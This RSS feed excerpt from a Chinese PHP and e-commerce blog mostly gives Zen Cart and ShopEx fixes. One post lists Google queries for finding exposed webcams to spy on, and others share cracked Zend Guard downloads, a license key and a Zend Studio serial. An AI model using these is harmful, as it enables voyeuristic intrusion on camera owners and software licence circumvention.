2、复制上面的结果到记事本，寻找RENAME TO wp_批量替换成 RENAME TO cool_wp（将前缀改成cool_前缀） 
3、再复制记事本的内容，粘帖到phpmyadmin的sql运行框内，执行。</description>
    </item>
    
    <item>
      <title>Zen Cart 138 在PHP5.3环境下出现的Fatal error: Cannot redeclare date_diff()</title>
      <link>https://ifunbox.top/398.html</link>
      <pubDate>Sun, 02 Sep 2012 13:20:04 +0000</pubDate>
      
      <guid>https://ifunbox.top/398.html</guid>
      <description>Zen Cart 138 在PHP5.3环境下出现的Fatal error: Cannot redeclare date_diff() in /zencart/includes/functions/functions_general.php on line 1481错误的解决方法
Zen Cart是一个比较流行的商城，尤其适合做外贸朋友，但当我们把PHP环境升级到PHP5.3的时候，Zen Cart就无法运行，并出现以下错误了：
Fatal error: Cannot redeclare date_diff() in /zencart/includes/functions/functions_general.php on line 1481
原因是在这个文件中已存在函数：date_diff()了，此时，我们需要做到与旧版本的PHP兼容，将Zen Cart中的date_diff()函数进行修改，解决方法如下：
if(function_exists(&#39;date_diff&#39;) &amp;amp;&amp;amp; phpversion() &amp;amp;gt;= 5.3){ date_diff(date_create($date1), date_create($date2)); }else{ function date_diff($date1, $date2) { //$date1 today, or any other day //$date2 date to check against $d1 = explode(&amp;quot;-&amp;quot;, $date1); $y1 = $d1[0]; $m1 = $d1[1]; $d1 = $d1[2]; $d2 = explode(&amp;quot;-&amp;quot;, $date2); $y2 = $d2[0]; $m2 = $d2[1]; $d2 = $d2[2]; $date1_set = mktime(0,0,0, $m1, $d1, $y1); $date2_set = mktime(0,0,0, $m2, $d2, $y2); return(round(($date2_set-$date1_set)/(60*60*24))); } }  在 上面，我们对date_diff()函数是否存在进行判断，并判断PHP版本号，另外，也可以看到我们使用了PHP新版本的函 数：date_create()，根据给出的日期时间参数返回 Unix 时间戳，详细资料可以参看：http://www.</description>
    </item>
    
    <item>
      <title>使用phpExcel类导出excel文件相关问题总结</title>
      <link>https://ifunbox.top/389.html</link>
      <pubDate>Fri, 06 Jul 2012 01:07:48 +0000</pubDate>
      
      <guid>https://ifunbox.top/389.html</guid>
      <description>总结一下最近使用phpexcel类导出excel 文件时遇到的问题，主要包括三大类：
1.导出时提示找不到文件怎么办？
2.导出excel时中文出现乱码的问题。
3.导出数据量大时，提示内存超过最大值或者运行时间超时的问题。
先看下phpexcel常用的方法总结（摘录自zeal_blog:http://www.zeali.net/entry/556）
getProperties()-setCreator(&#34;Maarten Balliauw&#34;) -setLastModifiedBy(&#34;Maarten Balliauw&#34;) -setTitle(&#34;Office 2007 XLSX Test Document&#34;) -setSubject(&#34;Office 2007 XLSX Test Document&#34;) -setDescription(&#34;Test document for Office 2007 XLSX, generated using PHP classes.&#34;) -setKeywords(&#34;office 2007 openxml php&#34;) -setCategory(&#34;Test result file&#34;); // Add some data $objPHPExcel-setActiveSheetIndex(0) -setCellValue(&#39;A1&#39;, &#39;Hello&#39;) -setCellValue(&#39;B2&#39;, &#39;world!&#39;) -setCellValue(&#39;C1&#39;, &#39;Hello&#39;) -setCellValue(&#39;D2&#39;, &#39;world!&#39;); // Miscellaneous glyphs, UTF-8 $objPHPExcel-setActiveSheetIndex(0) -setCellValue(&#39;A4&#39;, &#39;Miscellaneous glyphs&#39;) -setCellValue(&#39;A5&#39;, &#39;éàèùâêîôûëïüÿäöüç&#39;); // Rename worksheet $objPHPExcel-getActiveSheet()-setTitle(&#39;Simple&#39;); // Set active sheet index to the first sheet, so Excel opens this as the first sheet $objPHPExcel-setActiveSheetIndex(0); // Redirect output to a client’s web browser (Excel5) header(&#39;Content-Type: application/vnd.</description>
    </item>
    
    <item>
      <title>ZenCart新手基础问题</title>
      <link>https://ifunbox.top/340.html</link>
      <pubDate>Tue, 29 May 2012 01:20:14 +0000</pubDate>
      
      <guid>https://ifunbox.top/340.html</guid>
      <description>1.忘记zencart后台密码：
打开zencart数据库，再打开 admin数据表，直接修改管理员密码，admin_name设置为 admin，admin_pass设置为 351683ea4e19efe34874b501fdbf9792:9b，然后用 admin / admin 登录
2.修改后台地址
打开文件 admin/includes/configure.php，将所有出现 /admin/ 的地方改成自己定义的名字，需要修改的地方有3处:
define(&#39;DIR_WS_ADMIN&#39;, &#39;/xxx.com/admin/&#39;); define(&#39;DIR_WS_HTTPS_ADMIN&#39;, &#39;/xxx.com/admin/&#39;); define(&#39;DIR_FS_ADMIN&#39;, &#39;D:/Program Files/VertrigoServ/www/xxx.com/admin/&#39;);  然后，找到Zen Cart的目录/admin/ 。将该目录名按照 admin/includes/configure.php 中的定义作相应修改。
3.网站301转向
在htaccess文件文件中增加
RewriteCond %{HTTP_HOST} ^fanhefan.com [NC] RewriteRule ^(.*)$ http://www.fanhefan.com/$1 [L,R=301]  4.zencart robots.txt写法
自家的瓜最甜，我认为最好的写法
User-agent: * Disallow: /docs/ Disallow: /extras/ Disallow: /login.html Disallow: /logoff.html Disallow: /shopping_cart.html Disallow: /popup_image_additional.html Disallow: /product_reviews_write.html Disallow: /tell_a_friend.html Disallow: /pages-popup_image.html? Disallow: /popup_image_additional.html? Disallow: /index.php?main_page Disallow: /*?language=en Disallow: /discount_coupon.html Disallow: /shippinginfo.</description>
    </item>
    
    <item>
      <title>支付宝接口出现ERROR: 0 – php_network_getaddresses: getaddrinfo failed: 错误</title>
      <link>https://ifunbox.top/337.html</link>
      <pubDate>Fri, 25 May 2012 03:55:11 +0000</pubDate>
      
      <guid>https://ifunbox.top/337.html</guid>
      <description>服务器需开启openssl 和443 端口     支付宝接口出现ERROR: 0 &amp;#8211; php_network_getaddresses: getaddrinfo failed: 错误 就此解决！！   </description>
    </item>
    
    <item>
      <title>zend guard 4/5 破解版和免过期办法，已补授权Key一枚，成功注册。</title>
      <link>https://ifunbox.top/334.html</link>
      <pubDate>Tue, 08 May 2012 08:50:20 +0000</pubDate>
      
      <guid>https://ifunbox.top/334.html</guid>
      <description>以下为本人收集的zend guard使用和注册方法。
zend guard 4 有一个特别版，但使用破解补丁以后无法正常完成加密，但加密后的文件是可以正常使用的。以下是下载地址，可以使用迅雷和电驴下载。
点此下载：Zend.Guard.v4.0.1.CRACKED.rar
zend guard 4加密过的程序文件已经能被反编译过来，而zend guard 5目前还依然坚挺，可惜没有大侠放出特别版，买不起zend guard商业服务的个人和小公司几乎可以说是望尘莫及，以下是网上找到的一个免去试用版加密的文件有14天过期的限制。
首先下载以下的安装文件，目前最新版本是5.5.0，包含windows和linux两个版本，均为32位。
http://downloads.zend.com/guard/5.5.0/ZendGuard-5_5_0.exe
http://downloads.zend.com/guard/5.5.0/ZendGuard-5_5_0.tar.gz
使用ZendGuard 5 加密前，修改系统时间到 2099-12-31日，再加密文件，这样就不会出加密后的文件14天后过期的问题了。
今日朋友送来一枚授权，额，终于按是注册成功了，不敢独享，免费发布下载了。
干什么？快下载吧： zend_guard 5能用的授权，解压后会得到一个.zl文件，打开ZendGuard，Help-&amp;gt;register-&amp;gt;seach license from disk，然后注册ok！这个授权文件到期时间是2010年7月10号，把自己电脑的日期调到这个时间之前就可以用。笑。
至于如何使用ZendGuard，以前转摘有一个视频教程：
使用zend_guard对PHP代码进行加密，视频教程
转自http://vus520.diandian.com/post/2010-01-31/16039566</description>
    </item>
    
    <item>
      <title>如何解决zencart后台中文乱码？</title>
      <link>https://ifunbox.top/332.html</link>
      <pubDate>Tue, 08 May 2012 07:09:01 +0000</pubDate>
      
      <guid>https://ifunbox.top/332.html</guid>
      <description>解决zencart后台中文乱码方法
在确定数据库显示无乱码的情况下，打开admin（默认）/includes/configure.php 任意地方加入 define(&amp;#8216;DB_CHARSET&amp;#8217;, &amp;#8216;utf8&amp;#8217;);
zencart后台中文乱码的问题就此解决！！</description>
    </item>
    
    <item>
      <title>ShopEx与Discuz论坛（Ucenter）整合以及限制UID登录</title>
      <link>https://ifunbox.top/327.html</link>
      <pubDate>Mon, 07 May 2012 04:00:25 +0000</pubDate>
      
      <guid>https://ifunbox.top/327.html</guid>
      <description>最近碰到一个客户，需求是以限制UID限制Ucenter用户登录shopex系统，我也研究了下ShopEx与Discuz论坛（Ucenter）整合，发现确实强大无比。
我按照官网的ShopEx与Discuz论坛（Ucenter）整合说明整合了两个系统。
实现以限制UID限制Ucenter用户登录shopex系统方法如下
core\shop\controller\ctl.passport.php找到约554行
if ((is_array($uinfo)&amp;amp;&amp;amp;intval($uinfo[0])&amp;gt;0)||$info = $memberObj-&amp;gt;verifyLogin($_POST[&#39;login&#39;],$_POST[&#39;passwd&#39;],$message)){  替换成
if ((is_array($uinfo)&amp;amp;&amp;amp;intval($uinfo[0])&amp;gt;2&amp;amp;&amp;amp;$uinfo[0]&amp;amp;lt;5)||$info = $memberObj-&amp;gt;verifyLogin($_POST[&#39;login&#39;],$_POST[&#39;passwd&#39;],$message)){  intval($uinfo[0])&amp;gt;2&amp;amp;&amp;amp;$uinfo[0]2且
前提是Ucenter用户均未登录过shopex系统，因为登录过后shopex系统会插入Ucenter用户的用户信息，导致限制不准确。
&amp;nbsp;</description>
    </item>
    
    <item>
      <title>shopex4.8.5 后台群发,手动发送优惠券(可指定会员)</title>
      <link>https://ifunbox.top/316.html</link>
      <pubDate>Tue, 24 Apr 2012 07:13:51 +0000</pubDate>
      
      <guid>https://ifunbox.top/316.html</guid>
      <description>问题：shopex优惠券发放的不足，shopex优惠券发放一般有2种模式，一是通过促销活动系统自动发放，二是下载优惠券，然后把优惠券号码告之用户。
第二种方式弊端多多，1.加大了后台工作量（比如要发放给谁，发什么优惠券，发到哪里等这些都要详细的记录，优惠券与会员号要一一对应，难免会出现错误，降低网站的威信）；2.不利于客户管理自己的优惠券，如果通过之前的方式二，发放优惠券，优惠券可以通过邮箱或者站内消息发送给客户，但是不会出现在我的优惠栏目下。
插件展示：

群发按钮下多了一发优惠券按钮，下方画红圈的优惠券栏目是显示当前会员的优惠券信息，这是新加入的模块。

选中要发放优惠券的会员，然后点击多优惠券效果图如上所示。

优惠券发放成功的效果图，因为有了新模块，后台可以直接看到优惠券信息了
也可以登录前台查看</description>
    </item>
    
    <item>
      <title>同步发表WordPress博客日志到新浪博客插件</title>
      <link>https://ifunbox.top/297.html</link>
      <pubDate>Thu, 19 Apr 2012 01:40:36 +0000</pubDate>
      
      <guid>https://ifunbox.top/297.html</guid>
      <description>OUT了，今天才发现可以把自己的博客日志同步到新浪博客的插件
现在分享下 呵呵 希望对大家有帮助
http://wordpress.org/extend/plugins/wp2sinablog/installation/
感谢作者的无私奉献啊~</description>
    </item>
    
    <item>
      <title>Unable to find the socket transport ‘ssl’ – did you forget to enable it when you configured PHP? 问题解</title>
      <link>https://ifunbox.top/291.html</link>
      <pubDate>Fri, 06 Apr 2012 08:21:29 +0000</pubDate>
      
      <guid>https://ifunbox.top/291.html</guid>
      <description> 该错误表明PHP不支持openssl，解决方案：  windows下，在php.ini中打开opensll扩展（找到“;extension=php_openssl.dll”，去掉前面的分号，虚拟主机找服务商解决），并将php目录下的libeay32.dll和ssleay32.dll两个库拷贝到system32下；  linux下，重新编译php，编译时加上参数&amp;#8211;enable-ssl（具体参看configure的help）  </description>
    </item>
    
    <item>
      <title>shopex4.8.5工作记录,售后服务,售前服务登记 后台优化模块|插件</title>
      <link>https://ifunbox.top/284.html</link>
      <pubDate>Fri, 30 Mar 2012 09:18:02 +0000</pubDate>
      
      <guid>https://ifunbox.top/284.html</guid>
      <description>随着商城的慢慢壮大，客服也越来越多了。
由于客服采用轮休制导致如果这个客服休息，其他客服无法跟踪正在休息客服正在跟踪客户的情况。又考虑客服系统培训时间有限，系统不能太复杂。
为了解决这些问题，我基于shopex系统操作风格开发了一个记录售后服务信息的小模块。
先展示下效果图吧，该模版完全兼容原先shopex系统模块，不冲突，继承原shopex系统的界面，查询，导出，删除，恢复等功能。

&amp;nbsp;
&amp;nbsp;

&amp;nbsp;
shopex4.8.5工作记录,售后服务模块可以记录信息 如下 会员名，联系人姓名，联系方式，售后服务状态(待处理，已处理，处理中)，具体内容，也可以指定标签，添加信息备注，便于查找。
系统今天刚上线，目前使用良好。有了这个系统希望可以减少客服的工作量、信息更便于管理。
&amp;nbsp;
系统还会跟着需求，慢慢更新的，呵呵，给自己加个油！ 
&amp;nbsp;
基本思路
core\include_v5\adminSchema.php 需破解
相应加入左栏新菜单
在core\admin\controller\service新建ctl_service.php
在core\schemas新建service.php
在core\model_v5\service新建mdl.service.php
&amp;nbsp;
这个插件是有偿的 http://item.taobao.com/item.htm?id=16634764343
&amp;nbsp;
&amp;nbsp;
&amp;nbsp;
&amp;nbsp;</description>
    </item>
    
    <item>
      <title>IXWebhosting美国虚拟主机/空间视频教程</title>
      <link>https://ifunbox.top/279.html</link>
      <pubDate>Fri, 23 Mar 2012 05:05:22 +0000</pubDate>
      
      <guid>https://ifunbox.top/279.html</guid>
      <description>最近在网上整理了IXWebhosting美国虚拟主机/空间视频教程
感觉不错，希望能帮助到大家！
IXWebhosting视频教程之控制面板的登录与密码管理使用教程 IXWebhosting视频教程之免费赠送域名开通方法之实例演示 IXWebhosting视频教程之控制面板功能之详解 IXWebhosting视频教程之虚拟主机FTP的相关操作 IXWebhosting视频教程之虚拟主机PHPMyadmin的使用 IXWebhosting视频教程之虚拟主机MySQL独立数据库的建立 IXWebhosting视频教程之虚拟主机在线文件管理功能之实例演示 IXWebhosting视频教程之域名解析操作之实例演示 IXWebhosting视频教程之虚拟主机建立一个网站的完整步骤 IXWebhosting视频教程之虚拟主机搭建ShopEx网店 IXWebhosting视频教程之域名转出操作之实例演示 IXWebhosting视频教程之虚拟主机产品的续费 &amp;nbsp;
&amp;nbsp;
&amp;nbsp;</description>
    </item>
    
    <item>
      <title>完美解决shopex捆绑销售页的捆绑销售产品不显示规格的问题</title>
      <link>https://ifunbox.top/274.html</link>
      <pubDate>Tue, 07 Feb 2012 07:38:31 +0000</pubDate>
      
      <guid>https://ifunbox.top/274.html</guid>
      <description>未经修改的shopex在捆绑销售页以及产品页中的捆绑销售产品不显示规格，这个问题显得很不人性化。
首先下载mdl.package.php，然后覆盖掉core\model_v5\trading下的同名文件
PS:这个附件我已经改过了，破解了原本加密的代码，然后在getPackageItems方法下多输出了g.pdt_desc显示规格的参数。
然后打开core\shop\view\package\index.html在代码&amp;lt;{$items.name}&amp;gt;后加入 
&amp;lt;{if $items.pdt_desc!=&amp;#8221;}&amp;gt;(&amp;lt;{$items.pdt_desc}&amp;gt;)&amp;lt;{/if}&amp;gt;
PS:显示刚才多输出的规格，这边改的是捆绑销售页面，同理也可以改产品页下的捆绑销售板块。

原文地址：http://www.fanhefan.com/274.htm</description>
    </item>
    
    <item>
      <title>完美解决shopex产品页面捆绑销售重复显示的问题</title>
      <link>https://ifunbox.top/269.html</link>
      <pubDate>Tue, 07 Feb 2012 07:18:32 +0000</pubDate>
      
      <guid>https://ifunbox.top/269.html</guid>
      <description>今天无意中发现shopex产品页面捆绑销售重复显示的问题

觉得很神奇，回想自己明明只添加了一个捆绑销售信息（如图），怎么会显示出两条信息。

经过分析，才发现shopex产品页面捆绑销售重复显示可能是shopex 4.8.5之前都存在的小BUG，原因是把不同货品添加到了同一个捆绑销售里面，如上图所示的菜板，黑色大、绿色小不同规格。知道问题的原因，就开始寻找解决方法了。
打开core\shop\controller\ctl.product.php文件找到
$this-&amp;gt;pagedata[&amp;#8216;package&amp;#8217;] = $aPkgList;这段代码替换为
$this-&amp;gt;pagedata[&amp;#8216;package&amp;#8217;] = array_unique($aPkgList);
array_unique函数是php自带去除重复数组的函数，去除了重复内容后当然就只有自己想要显示的内容啦。
就此shopex产品页面捆绑销售重复显示的问题完美解决。

原文地址:http://www.fanhefan.com/269.html
&amp;nbsp;
&amp;nbsp;</description>
    </item>
    
    <item>
      <title>使用Google搜索全球网络摄像头(偷窥就在你身边)</title>
      <link>https://ifunbox.top/259.html</link>
      <pubDate>Fri, 20 Jan 2012 08:59:13 +0000</pubDate>
      
      <guid>https://ifunbox.top/259.html</guid>
      <description>你的电脑联网了么？你喜欢使用摄像头么？不管你使用摄像头做什么用途。现在提醒你，可要小心了。 
近来，网上流传着一些用google搜索到的网络摄像头地址。网友们可以通过在google里面输入一段代码而捕捉到安装于世界各地的网络摄像头。并且可以调整摄像头的摄像角度和变焦来对某个物体或地方进行监视或偷窥。摄像头使用者们原本以为只有自己才能够看到的内容，在不知不觉中已经失去了安全保护，赤裸裸的暴露在互联网上。
通过google 搜索到带有网页的网络摄像头无疑使我们担忧再次加重了。被一个人偷窥已经是很糟糕的事情了，想想如果连到互联网上&amp;#8230; &amp;#8230;，你的心情会如何？当你在商场试衣间里换衣服的时候是否会突然想到有没有摄像头在窥视自己。当你在合租的房子里洗澡时是否会担心被不知道安在何处的摄像头偷窥？当你在和朋友视频聊天的时候是否也会有&amp;#8221;第三只眼&amp;#8221;躲在你不知道的角落里？办公室里、大街上、商场、公园、家里&amp;#8230;&amp;#8230;&amp;#8230;..偷窥仿佛已经无处不在。现在，我只能迫切希望在科技发展的同时，安全防范问题也及时的跟上脚步。这样才能使人们真正享受到高科技发展所带来的意义。
摄像头查找办法： 
在google里面输入:
nurl:&amp;#8221;ViewerFrame?Mode=&amp;#8221;
inurl:&amp;#8221;ViewerFrame?Mode=&amp;#8221; 
inurl:&amp;#8221;view/index.shtml&amp;#8221; 
inurl:&amp;#8221;MultiCameraFrame?Mode=&amp;#8221; 
inurl:&amp;#8221;axis-cgi/mjpg&amp;#8221;
就可以搜到网络摄像头，据说全世界有好几万部。
使用下面的方法，还能搜索到很多有用的资源
在搜索框上输入： “index of/ ” inurl:lib 再按搜索你将进入许多图书馆，并且一定能下载自己喜欢的书籍。
在搜索框上输入： “index of /” cnki 再按搜索你就可以找到许多图书馆的CNKI、VIP、超星等入口！
在搜索框上输入：　“index of /” ppt 再按搜索你就可以突破网站入口下载powerpint作品！
在搜索框上输入： “index of /” mp3 再按搜索你就可以突破网站入口下载mp3、rm等影视作品！
在搜索框上输入：　“index of /” swf 再按搜索你就可以突破网站入口下载flash作品！
在搜索框上输入： “index of /” 要下载的软件名再按搜索你就可以突破网站入口下载软件！
注意引号应是英文的！</description>
    </item>
    
    <item>
      <title>基于mootools的SHOPEX图片延迟加载挂件</title>
      <link>https://ifunbox.top/249.html</link>
      <pubDate>Thu, 19 Jan 2012 11:38:17 +0000</pubDate>
      
      <guid>https://ifunbox.top/249.html</guid>
      <description>有很多SHOPEX朋友发过图片延迟加载的挂件，基本都是基于jquery写的，但是SHOPEX是基于mootools开发UI的，所以在shopex下使用基于jquery写的挂件就会出现不兼容mootools、重复加载js代码这些令人烦恼的问题。
在这里也简单说一下延迟加载的原理。就是把图片src属性改成data-src，在滚动到当前区域时通过Js改变src值为data-src值。从而达到图片延迟请求，滚到哪请求到哪的效果。
网络上一搜发现外国牛人已经写好了基于mootools延迟加载挂件&amp;#8212;lazyload,感动得都快哭了。

应用在shopex只需要小小的改动下需要延迟加载产品图片的img即可。
下面我就具体说说如何操作吧。
首先在head中引入lazyload这个插件，具体方法看lazyload介绍页，很简单的。
这里需要说明下下载的MooTools Javascript Class中有个elements的值需要改变自己shopex中的值，这个值如何取是根据的是shopex需要延迟加载图片div的class或者id值，就是选择器要选择正确就是了。留意红体字。
 SHOPEX中需要延迟加载图片附近代码：   ```   ```  lazyload代码片段:   options: { range: 200, elements: &amp;quot;.goodsImg img&amp;quot;, container: window, mode: &amp;quot;vertical&amp;quot;, realSrcAttribute: &amp;quot;data-src&amp;quot;, useFade: true },   然后就是修改&amp;lt;img width=&amp;#8221;185&amp;#8243; height=&amp;#8221;185&amp;#8243; title=&amp;#8221;竹纤维洗碗布（硬）&amp;#8221; src=&amp;#8221;images/goods/20120109/1a1b7031b81f8e6b.jpg&amp;#8221;&amp;gt;为img width=&amp;#8221;185&amp;#8243; height=&amp;#8221;185&amp;#8243; title=&amp;#8221;竹纤维洗碗布（硬）&amp;#8221; data-src=&amp;#8221;images/goods/20120109/1a1b7031b81f8e6b.jpg&amp;#8221;&amp;gt;  &amp;nbsp;  到了这里基于mootools的SHOPEX图片延迟加载挂件就安装结束了，shopex系统浏览速度就有了很大的提高了。  &amp;nbsp;</description>
    </item>
    
    <item>
      <title>如何解决Shopex4.8.5中关于 Mootools和jQuery 的冲突问题?</title>
      <link>https://ifunbox.top/247.html</link>
      <pubDate>Thu, 19 Jan 2012 07:47:10 +0000</pubDate>
      
      <guid>https://ifunbox.top/247.html</guid>
      <description>ShopEx4.8.5系统用了很多客户端JS特效，特别是后台的管理界面，为了给用户更好的软件体验，更是大量加入了Javascript脚本实现界面和Ajax操作。
ShopEx的Js脚本都扩展于Mootools脚本库，mootools和jquery一样是属于比较轻巧的Js库，是做前端开发必不可少的脚本库，两者功能相近，开源协议也一样都可以使用 MIT license，Jquery的插件库更丰富一点，在国内使用Jquery的网站也多于mootools，要找些现成的JS脚本制作ShopEx插件应该是更容易，那为什么ShopEx的设计者当初选用了Mootools作为前端脚本库而不是Jquery。ShopEx系统研究认为这可能是设计者的技术偏好，因为mootools更符合所谓的编程模式，让开发人员更容易去定义扩展一个类，代码的类结构更合理清晰，写一个类所需的代码量更少，所以决定选用mootools也合情合理，因为开发人员的出发点永远是写最少的代码在最多的地方使用，达到代码重用的目的。
不过这增加了普通模板设计师以及第三方服务商基于ShopEx系统定制做模板和插件的难度，因为Jquery更直接简单，国内可找到的资源多，论坛上也有用户提到一个办法可以解决在ShopEx系统中使用Jquery冲突的办法，虽然比较麻烦不利于升级，有急需安装某个Jquery效果的也可以一试：
解决Shopex中关于 Mootools和jQuery 的冲突问题的方法
在你的模板目录/block/header.html 里面的标签前添加以下代码


jQuery.noConflict();

然后是替换选择器，把使用jquery里面的所有$都替换为jQuery。</description>
    </item>
    
    <item>
      <title>PHP采集利器snoopy应用详解</title>
      <link>https://ifunbox.top/243.html</link>
      <pubDate>Wed, 18 Jan 2012 08:22:03 +0000</pubDate>
      
      <guid>https://ifunbox.top/243.html</guid>
      <description>Snoopy是一个php类，用来模拟浏览器的功能，可以获取网页内容，发送表单。Snoopy正确运行需要你的服务器的PHP版本在4以上，并且支持PCRE（Perl Compatible Regular Expressions），基本的LAMP服务都支持。
一、Snoopy的一些特点:
1.抓取网页的内容 fetch
2.抓取网页的文本内容 (去除HTML标签) fetchtext
3.抓取网页的链接，表单 fetchlinks fetchform
4.支持代理主机
5.支持基本的用户名/密码验证
6.支持设置user_agent, referer(来路), cookies和header content(头文件)
7.支持浏览器重定向，并能控制重定向深度
8.能把网页中的链接扩展成高质量的url(默认)
9.提交数据并且获取返回值
10.支持跟踪HTML框架
11.支持重定向的时候传递cookies，要求php4以上就可以了，由于本身是php一个类，无需扩支持，服务器不支持curl时候的最好选择。
二、类方法:
fetch($URI)
———–
这是为了抓取网页的内容而使用的方法。$URI参数是被抓取网页的URL地址。抓取的结果被存储在 $this-&amp;gt;results 中。如果你正在抓取的是一个框架，Snoopy将会将每个框架追踪后存入数组中，然后存入 $this-&amp;gt;results。
fetchtext($URI)
—————
本方法类似于fetch()，唯一不同的就是本方法会去除HTML标签和其他的无关数据，只返回网页中的文字内容。
fetchform($URI)
—————
本方法类似于fetch()，唯一不同的就是本方法会去除HTML标签和其他的无关数据，只返回网页中表单内容(form)。
fetchlinks($URI)
—————-
本方法类似于fetch()，唯一不同的就是本方法会去除HTML标签和其他的无关数据，只返回网页中链接(link)。
默认情况下，相对链接将自动补全，转换成完整的URL。
submit($URI,$formvars)
———————-
本方法向$URL指定的链接地址发送确认表单。$formvars是一个存储表单参数的数组。
submittext($URI,$formvars)
————————–
本方法类似于submit()，唯一不同的就是本方法会去除HTML标签和其他的无关数据，只返回登陆后网页中的文字内容。
submitlinks($URI)
—————-
本方法类似于submit()，唯一不同的就是本方法会去除HTML标签和其他的无关数据，只返回网页中链接(link)。
默认情况下，相对链接将自动补全，转换成完整的URL。
三、类属性: (缺省值在括号里)
$host 连接的主机
$port 连接的端口
$proxy_host 使用的代理主机，如果有的话
$proxy_port 使用的代理主机端口，如果有的话
$agent 用户代理伪装 (Snoopy v0.1)
$referer 来路信息，如果有的话
$cookies cookies， 如果有的话</description>
    </item>
    
    <item>
      <title>shopex优惠券使用简化教程(购物车自动列出优惠券)</title>
      <link>https://ifunbox.top/239.html</link>
      <pubDate>Mon, 16 Jan 2012 02:18:16 +0000</pubDate>
      
      <guid>https://ifunbox.top/239.html</guid>
      <description>最近自己负责维护运营的shopex购物站，做迎新大促销，只要用户登录这个shopex网站就会得到一张优惠券，随之问题就来了，很多客户反复的询问优惠券的如何使用这个问题，让人不堪其扰。
其实导致这个问题出现的原因就是在shopex下使用优惠券太麻烦了，流程太繁琐。未经修改的shopex优惠券使用流程是，先进入我的优惠券，查看优惠券信息，然后复制优惠券号码，进入shopex购物车，粘帖优惠券号码到相应位置。
显然查看复制优惠券号码是多余的一步，然后我们要简化他，让shopex系统自己查询列出来。
 
详情点击</description>
    </item>
    
    <item>
      <title>怎么让shopex捆绑促销显示出产品图片？</title>
      <link>https://ifunbox.top/235.html</link>
      <pubDate>Fri, 13 Jan 2012 08:37:22 +0000</pubDate>
      
      <guid>https://ifunbox.top/235.html</guid>
      <description>最近打开shopex的捆绑促销页面越看越不爽，没有产品图用户体验太差了，后决心修改下，研究才发现那么的简单。希望能帮助到被shopex捆绑促销不显示出产品图片的朋友们。
打开core\shop\view\package\index.html，下面捆绑促销显示页面代码中加粗的地方就是显示捆绑促销产品图片的代码。可以自己加入该页面的任何页面，自己喜欢就好！另附CSS。
先上效果图：

捆绑促销页面代码:
&amp;amp;lt;{foreach from=$package item=&amp;quot;itemlist&amp;quot;}&amp;amp;gt; &amp;amp;lt;{$itemlist.name}&amp;amp;gt; &amp;amp;lt;{if $itemlist.intro}&amp;amp;gt; &amp;amp;lt;{$itemlist.intro}&amp;amp;gt; &amp;amp;lt;{/if}&amp;amp;gt; &amp;amp;lt;{t}&amp;amp;gt;此买就送促销产品包括：&amp;amp;lt;{/t}&amp;amp;gt; &amp;amp;lt;{foreach from=$itemlist.items item=&amp;quot;items&amp;quot;}&amp;amp;gt; &amp;quot; target=&amp;quot;_blank&amp;quot;&amp;amp;gt;&amp;quot;&amp;amp;lt;{$items.name}&amp;quot;/&amp;amp;gt; &amp;amp;lt;{$items.name}&amp;amp;gt; &amp;amp;lt;{t}&amp;amp;gt;数量:&amp;amp;lt;{/t}&amp;amp;gt;&amp;amp;lt;{$items.pkgnum}&amp;amp;gt;&amp;amp;lt;{t}&amp;amp;gt; 单价:&amp;amp;lt;{/t}&amp;amp;gt;&amp;amp;lt;{$items.price|cur}&amp;amp;gt; &amp;amp;lt;{/foreach}&amp;amp;gt; &amp;amp;lt;{t}&amp;amp;gt;原价：&amp;amp;lt;{/t}&amp;amp;gt; &amp;amp;lt;{$itemlist.mktprice|cur}&amp;amp;gt; &amp;amp;lt;{t}&amp;amp;gt;买就送价：&amp;amp;lt;{/t}&amp;amp;gt; &amp;amp;lt;{$itemlist.price|cur}&amp;amp;gt; &amp;amp;lt;{if $itemlist.mktprice &amp;amp;gt; $itemlist.price &amp;amp;&amp;amp; $setting.mktprice &amp;amp;&amp;amp; $setting.saveprice &amp;amp;gt; 0}&amp;amp;gt; &amp;amp;lt;{if $setting.saveprice == 1}&amp;amp;gt;&amp;amp;lt;{t}&amp;amp;gt;节省：&amp;amp;lt;{/t}&amp;amp;gt;&amp;amp;lt;{$itemlist.mktprice-$itemlist.price|cur}&amp;amp;gt; &amp;amp;lt;{elseif $setting.saveprice == 2}&amp;amp;gt;&amp;amp;lt;{t}&amp;amp;gt;优惠：&amp;amp;lt;{/t}&amp;amp;gt;&amp;amp;lt;{$itemlist.price/$itemlist.mktprice*100|number:&#39;2&#39;}&amp;amp;gt;% &amp;amp;lt;{elseif $setting.saveprice == 3}&amp;amp;gt;&amp;amp;lt;{$itemlist.price/$itemlist.mktprice*10|number:&#39;1&#39;}&amp;amp;gt;折 &amp;amp;lt;{/if}&amp;amp;gt; &amp;amp;lt;{/if}&amp;amp;gt; &amp;quot;&amp;amp;gt;&amp;amp;lt;{t}&amp;amp;gt;购买&amp;amp;lt;{/t}&amp;amp;gt; &amp;amp;lt;{/foreach}&amp;amp;gt; &amp;amp;lt;{pager data=$pager}&amp;amp;gt;  CSS代码：
 /*捆绑页面出图CSS*/ .PackageGoodsWrap ul.list li{float:left;background:url(ra.gif) no-repeat 0 8px;padding-left:15px;color:#666;display:block;line-height:23px;margin-left:30px;border-bottom: none;} .PackageGoodsWrap .push-6{margin:0;} .PackageGoodsWrap .span-6{float:right;}  </description>
    </item>
    
    <item>
      <title>Zend Studio 9.0正式版注册破解</title>
      <link>https://ifunbox.top/225.html</link>
      <pubDate>Thu, 12 Jan 2012 06:55:30 +0000</pubDate>
      
      <guid>https://ifunbox.top/225.html</guid>
      <description>Zend Studio 9.0.0 正式版官方下载地址(未包含IBM i edition下载)
windows版：http://downloads.zend…ZendStudio-9.0.0.msi
linux版(32位)：http://downloads.zend…/ZendStudio-9.0.0-x86.tar.gz
linux版(64位)：http://downloads.zend…ZendStudio-9.0.0-x86_64.tar.gz
适用于Mac_OS_X的DMG安装格式：http://downloads.zend…ZendStudio-9.0.0.dmg
zend studio 8 注册码(适用于7.0以上所有版本)
Username: zendstudio.net
Serial Number: 3727234F6095F72034F6095F
写在前头
以下方法仅供技术交流学习，请勿非法使用，如长期使用请支持购买正版。
正版购买地址：http://shop.zend.com/en/zend-studio-for-eclipse.html
Zend Studio 9 注册码 Zend Studio 9 破解方法
第一步：如果已经安装过Zend Studio 9.0的,请打开Zend Studio
9.0,在菜单中“help&amp;gt;Unregister”,如果显示是灰的跳过此步退出Zend
Studio。如果显示可以点击的请点击，这时Zend Studio会重启，重启到要求你填注册码时点“QUIT”按钮
